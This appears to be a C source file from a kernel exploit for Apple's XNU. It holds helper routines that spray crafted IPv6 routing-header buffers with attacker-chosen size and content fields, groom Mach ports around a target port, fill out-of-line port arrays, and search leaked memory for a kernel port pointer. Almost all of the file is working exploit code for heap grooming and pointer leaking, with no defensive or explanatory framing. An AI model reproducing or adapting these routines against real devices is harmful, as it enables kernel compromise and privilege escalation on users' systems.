#include <stdio.h>
#include <stdlib.h>

#include "helper.h"
#include "spray.h"

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if (i % 16 == 0) {
            printf("%p  ", data+i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}

void set_user_data_e_size(uint8_t *buf, uint32_t e_size) {
    uint32_t *e_size_ptr;
    e_size_ptr = (uint32_t *)(buf+E_SIZE_OFFSET);
    *e_size_ptr = e_size;
}

void set_user_data_e_content(uint8_t *buf, uint64_t e_content) {
    uint64_t *e_content_ptr;
    e_content_ptr = (uint64_t *)(buf+E_CONTENT_OFFSET);
    *e_content_ptr = e_content;
}

void prepare_spray_buf(uint8_t ***buf, size_t *buf_len, size_t spray_size, uint32_t e_size) {
    uint8_t *rthdr, *tmp_buf;
    uint8_t **buf_array;
    size_t rthdr_len;
    int i;

    buf_array = calloc(N_SOCKETS, sizeof(uintptr_t));

    rthdr_len = prepare_rthdr_msg(&rthdr, spray_size);
    set_user_data_e_size(rthdr, e_size);

    for (i = 0; i < N_SOCKETS; i++) {
        set_user_data_e_content(rthdr, MAGIC_CONSTANT + i);
        tmp_buf = calloc(rthdr_len, sizeof(uint8_t));
        memcpy(tmp_buf, rthdr, rthdr_len);
        buf_array[i] = tmp_buf;
    }

    *buf = buf_array;
    *buf_len = rthdr_len;
}

int prepare_ports(mach_port_t **before_ports, mach_port_t **after_ports,
                  mach_port_t *target_port) {
    int i, j, k, ret;

    *before_ports = calloc(N_BEFORE_PORTS, sizeof(mach_port_t));
    *after_ports = calloc(N_AFTER_PORTS, sizeof(mach_port_t));

    for (i = 0; i < N_BEFORE_PORTS; i++) {
        if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*before_ports)[i])) != KERN_SUCCESS)
        {
            ERROR_LOG("before_ports Allocation %d Failed: %x", i, ret);
            goto clean_before;
        }
    }   

    if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, target_port) != KERN_SUCCESS))
    {
        ERROR_LOG("target_port Allocation Failed: %x", ret);
        goto clean_before;
    }
    mach_port_insert_right(mach_task_self(), *target_port, *target_port, MACH_MSG_TYPE_MAKE_SEND);

    for (j = 0; j < N_AFTER_PORTS; j++)
    {
        if ((ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &(*after_ports)[j])) != KERN_SUCCESS)
        {
            ERROR_LOG("after_ports Allocation %d Failed: %x", j, ret);
            goto clean_after;
        }
    }

    ret = 0;
    goto out;

clean_after:
    mach_port_destroy(mach_task_self(), *target_port);
    for (k = 0; k < j; k++)
        mach_port_destroy(mach_task_self(), (*after_ports)[k]);

clean_before:
    for (k = 0; k < i; k++)
        mach_port_destroy(mach_task_self(), (*before_ports)[k]);

    ret = 1;

out:
    if (ret)
    {
        ERROR_LOG("Could Not Prepare Ports");
    }
    else
    {
        DEBUG_LOG("Prepared Ports");
    }

    return ret;
}

int destroy_ports(mach_port_t *before_ports, mach_port_t *after_ports,
                  mach_port_t target_port) {
    int i; 
    for (i = 0; i < N_BEFORE_PORTS; i++) {
        mach_port_destroy(mach_task_self(), before_ports[i]);
    }
    for (i = 0; i < N_AFTER_PORTS; i++) {
        mach_port_destroy(mach_task_self(), after_ports[i]);
    }
    mach_port_destroy(mach_task_self(), target_port);

    return 0;
}

mach_port_t * prepare_spray_ports(mach_port_t target_port) {
    mach_port_t *ports;
    int i;

    ports = calloc(OOL_PORTS, sizeof(mach_port_t));
    for (i = 0; i < OOL_PORTS; i++) {
        ports[i] = target_port;
    }

    return ports;
}

uintptr_t search_for_port_pointer_leak(uint8_t *buf) {
    uintptr_t *ptr_array, *candidate_ptr, *spray_block;
    uintptr_t candidate;
    size_t offset, inner_offset;

    candidate = 0;

    for (offset = (UNCORRUPTED_RECIPE_SIZE / sizeof(uintptr_t)); 
         offset <= (E_SIZE_SPRAY - (SPRAY_ZONE)); 
         offset += (SPRAY_ZONE / sizeof(uintptr_t))) {
        ptr_array = (uintptr_t *)buf;
        ptr_array += offset;
        INFO_LOG("ptr_array: %p", ptr_array);
        candidate_ptr = memmem(ptr_array, SPRAY_ZONE, "\xff\xff\xff", 3) - 5;
        if ((uintptr_t)candidate_ptr % 16 != 0) {
            continue;
        }
        
        spray_block = candidate_ptr;
        INFO_LOG("Candidate Ptr: %p", candidate_ptr);
        hexdump(candidate_ptr, sizeof(uintptr_t));
        for (inner_offset = 0; inner_offset < SPRAY_ZONE / sizeof(uintptr_t); inner_offset++) {
            // INFO_LOG("Comparing: %p", spray_block + inner_offset);
            // hexdump(spray_block + inner_offset, sizeof(uintptr_t));
            if (memcmp(spray_block + inner_offset, candidate_ptr, sizeof(uintptr_t))) {
                break;
            }
        }
        if (inner_offset == 32) {
            memcpy(&candidate, candidate_ptr, sizeof(uintptr_t));
            break;
        }
    }
    return candidate;
}